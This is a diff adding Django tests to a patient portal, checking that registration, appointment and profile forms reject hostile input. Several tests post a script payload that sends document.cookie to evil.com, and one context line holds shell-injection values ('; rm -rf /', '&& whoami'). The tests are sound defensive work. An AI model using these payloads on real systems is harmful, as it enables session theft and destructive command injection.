@@ -99,6 +99,32 @@ class PatientPortalTests(TestCase):
 		self.assertContains(response, "Nama hanya boleh")
 		self.assertFalse(UserAccount.objects.filter(username="newpatient").exists())
 
+	def test_self_registration_rejects_script_payload_in_all_text_fields(self):
+		payload = "<script>document.location='http://evil.com?c='+document.cookie</script>"
+
+		response = self.client.post(
+			reverse("core_app:patient_register"),
+			{
+				"username": payload,
+				"email": "new@example.com",
+				"password": payload,
+				"confirm_password": payload,
+				"full_name": payload,
+				"date_of_birth": "2000-01-01",
+				"address": payload,
+				"phone_number": payload,
+			},
+		)
+
+		self.assertEqual(response.status_code, 200)
+		self.assertContains(response, "Username hanya boleh")
+		self.assertContains(response, "Password mengandung karakter")
+		self.assertContains(response, "Konfirmasi password mengandung karakter")
+		self.assertContains(response, "Nama hanya boleh")
+		self.assertContains(response, "Alamat mengandung karakter")
+		self.assertContains(response, "No. telepon hanya boleh")
+		self.assertFalse(UserAccount.objects.filter(email="new@example.com").exists())
+
 	def test_patient_cannot_access_other_patient_encounter(self):
 		self.client.login(username="patient1", password="StrongPassword123!")
 
@@ -137,6 +163,53 @@ class PatientPortalTests(TestCase):
 
 		self.assertEqual(response.status_code, 302)
 		self.assertTrue(Appointment.objects.filter(patient=self.patient, status="PENDING").exists())
+
+	def test_patient_request_appointment_requires_doctor(self):
+		self.client.login(username="patient1", password="StrongPassword123!")
+
+		response = self.client.post(
+			reverse("core_app:patient_request_appointment"),
+			{
+				"scheduledAt": (timezone.now() + timezone.timedelta(days=2)).strftime("%Y-%m-%dT%H:%M"),
+				"reason": "Kontrol rutin",
+			},
+		)
+
+		self.assertEqual(response.status_code, 200)
+		self.assertContains(response, "Dokter wajib dipilih.")
+		self.assertFalse(Appointment.objects.filter(patient=self.patient, status="PENDING").exists())
+
+	def test_patient_request_appointment_requires_date(self):
+		self.client.login(username="patient1", password="StrongPassword123!")
+
+		response = self.client.post(
+			reverse("core_app:patient_request_appointment"),
+			{
+				"doctor": str(self.doctor_staff.id),
+				"reason": "Kontrol rutin",
+			},
+		)
+
+		self.assertEqual(response.status_code, 200)
+		self.assertContains(response, "Tanggal dan waktu janji temu wajib diisi.")
+		self.assertFalse(Appointment.objects.filter(patient=self.patient, status="PENDING").exists())
+
+	def test_patient_request_appointment_rejects_script_payload_reason(self):
+		self.client.login(username="patient1", password="StrongPassword123!")
+		payload = "<script>document.location='http://evil.com?c='+document.cookie</script>"
+
+		response = self.client.post(
+			reverse("core_app:patient_request_appointment"),
+			{
+				"doctor": str(self.doctor_staff.id),
+				"scheduledAt": (timezone.now() + timezone.timedelta(days=2)).strftime("%Y-%m-%dT%H:%M"),
+				"reason": payload,
+			},
+		)
+
+		self.assertEqual(response.status_code, 200)
+		self.assertContains(response, "Keluhan hanya boleh")
+		self.assertFalse(Appointment.objects.filter(patient=self.patient, reason=payload).exists())
 
 	def test_patient_can_edit_own_profile(self):
 		self.client.login(username="patient1", password="StrongPassword123!")
@@ -184,6 +257,27 @@ class PatientPortalTests(TestCase):
 				"dateOfBirth": "1999-01-01",
 				"address": "Jl. Aman 1; rm -rf /",
 				"phoneNumber": "08123456789 && whoami",
+			},
+		)
+
+		self.assertEqual(response.status_code, 200)
+		self.assertContains(response, "Nama hanya boleh")
+		self.assertContains(response, "Alamat mengandung karakter")
+		self.assertContains(response, "No. telepon hanya boleh")
+		self.patient.refresh_from_db()
+		self.assertEqual(self.patient.name, "Patient One")
+
+	def test_patient_profile_edit_rejects_script_payload_fields(self):
+		self.client.login(username="patient1", password="StrongPassword123!")
+		payload = "<script>document.location='http://evil.com?c='+document.cookie</script>"
+
+		response = self.client.post(
+			reverse("core_app:patient_edit", args=[self.patient.id]),
+			{
+				"name": payload,
+				"dateOfBirth": "1999-01-01",
+				"address": payload,
+				"phoneNumber": payload,
 			},
 		)
 
